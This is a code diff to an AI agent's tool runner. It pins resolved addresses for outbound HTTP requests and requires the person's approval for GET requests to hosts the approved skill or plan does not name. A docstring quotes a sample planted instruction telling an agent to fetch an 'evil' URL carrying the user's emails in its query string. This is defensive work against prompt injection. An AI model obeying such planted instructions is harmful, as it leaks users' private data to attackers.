@@ -32,6 +32,7 @@ import asyncio
 import json
 import logging
 import operator
+import re
 from datetime import datetime, timedelta, timezone
 from decimal import Decimal, InvalidOperation
 from typing import Any
@@ -496,21 +497,23 @@ def calculate(expression: str) -> str:
 async def _http_request(args: dict[str, Any]) -> dict[str, Any]:
     import httpx
 
-    from core.net_safety import check_public_url
+    from core.net_safety import pinned_request_args, resolve_public_url
 
     method = str(args.get("method") or "GET").upper()
-    url = await check_public_url(str(args.get("url") or ""))
+    url, address = await resolve_public_url(str(args.get("url") or ""))
+    pinned, host_header, extensions = pinned_request_args(url, address)
     headers = {
         str(k)[:100]: str(v)[:2000] for k, v in (args.get("headers") or {}).items()
         if str(k).lower() not in {"host", "content-length", "cookie"}
     }
-    kwargs: dict[str, Any] = {"headers": headers}
+    headers.update(host_header)
+    kwargs: dict[str, Any] = {"headers": headers, "extensions": extensions}
     if isinstance(args.get("json"), (dict, list)):
         kwargs["json"] = args["json"]
     elif args.get("body"):
         kwargs["content"] = str(args["body"])[:100_000]
     async with httpx.AsyncClient(timeout=20, follow_redirects=False) as client:
-        response = await client.request(method, url, **kwargs)
+        response = await client.request(method, pinned, **kwargs)
     body = response.text[:MAX_RESULT_CHARS] if method != "HEAD" else ""
     return {"status": response.status_code, "content_type": response.headers.get("content-type", ""),
             "body": body, "redirect_to": response.headers.get("location") if response.is_redirect else None}
@@ -579,10 +582,28 @@ async def _create_meeting(org_id: str, user_id: str, args: dict[str, Any], tz: s
     )
 
 
-def needs_approval(name: str, args: dict[str, Any]) -> bool:
+def needs_approval(name: str, args: dict[str, Any], allowed_hosts: set[str] | None = None) -> bool:
+    """Outbound actions need the person's approval. A GET is free only to a host the
+    approved skill or plan names: anywhere else, a URL could carry data out in its
+    query string (a planted instruction like "fetch https://evil/?d=<emails>")."""
+
     if name in APPROVAL_TOOLS:
         return True
-    return name == "http_request" and str(args.get("method") or "GET").upper() not in SAFE_HTTP_METHODS
+    if name != "http_request":
+        return False
+    if str(args.get("method") or "GET").upper() not in SAFE_HTTP_METHODS:
+        return True
+    from urllib.parse import urlsplit
+
+    host = (urlsplit(str(args.get("url") or "")).hostname or "").lower()
+    return host not in (allowed_hosts or set())
+
+
+_HOST_IN_TEXT = re.compile(r"https?://([A-Za-z0-9.-]+)", re.IGNORECASE)
+
+
+def hosts_named_in(*texts: str) -> set[str]:
+    return {m.lower().rstrip(".") for t in texts for m in _HOST_IN_TEXT.findall(t or "")}
 
 
 async def execute_tool(run: dict[str, Any], name: str, args: dict[str, Any]) -> Any:
@@ -648,7 +669,10 @@ def _result_message(call_id: str, result: Any) -> dict[str, Any]:
     return {"role": "tool", "tool_call_id": call_id, "content": content[:MAX_RESULT_CHARS]}
 
 
-async def _drain(run: dict[str, Any], calls: list[dict[str, Any]], auto_approve: bool) -> bool:
+async def _drain(
+    run: dict[str, Any], calls: list[dict[str, Any]], auto_approve: bool,
+    allowed_hosts: set[str] | None = None,
+) -> bool:
     """Run queued tool calls in order. Returns False when the run paused or ended."""
 
     messages = json.loads(run["messages"])
@@ -686,7 +710,7 @@ async def _drain(run: dict[str, Any], calls: list[dict[str, Any]], auto_approve:
             _log(run, {"kind": "device", "tool": name, "status": "pending", "summary": str(args.get("steps"))[:500]})
             run["messages"] = json.dumps(messages)
             return False
-        if needs_approval(name, args) and not auto_approve:
+        if needs_approval(name, args, allowed_hosts) and not auto_approve:
             run.update(status="needs_approval", pending=json.dumps({"calls": calls, "tool": name, "arguments": args}))
             _log(run, {"kind": "approval", "tool": name, "status": "pending", "summary": _short(args)})
             run["messages"] = json.dumps(messages)
@@ -744,9 +768,12 @@ async def advance(org_id: str, user_id: str, run_id: str) -> None:
     automation = await _automation_by_id(run["automation_id"])
     skill = await _skill(org_id, user_id, run["skill_id"])
     auto_approve = bool(automation and automation.get("auto_approve")) and skill.created_by == user_id
+    allowed_hosts = hosts_named_in(
+        _skill_text(skill), json.dumps((automation or {}).get("plan") or {})
+    )
     try:
         pending = json.loads(run["pending"]) if run.get("pending") else None
-        if pending and not await _drain(run, pending.get("calls") or [], auto_approve):
+        if pending and not await _drain(run, pending.get("calls") or [], auto_approve, allowed_hosts):
             return await _store(run)
         while run["status"] == "running":
             if run.get("rounds", 0) >= MAX_ROUNDS:
@@ -759,7 +786,7 @@ async def advance(org_id: str, user_id: str, run_id: str) -> None:
                 last = json.loads(run["messages"])[-1].get("content") or "Done."
                 run.update(status="completed", summary=str(last)[:2000])
                 break
-            if not await _drain(run, calls, auto_approve):
+            if not await _drain(run, calls, auto_approve, allowed_hosts):
                 break
             if await _stopped(run["run_id"]):
                 run["status"] = "stopped"
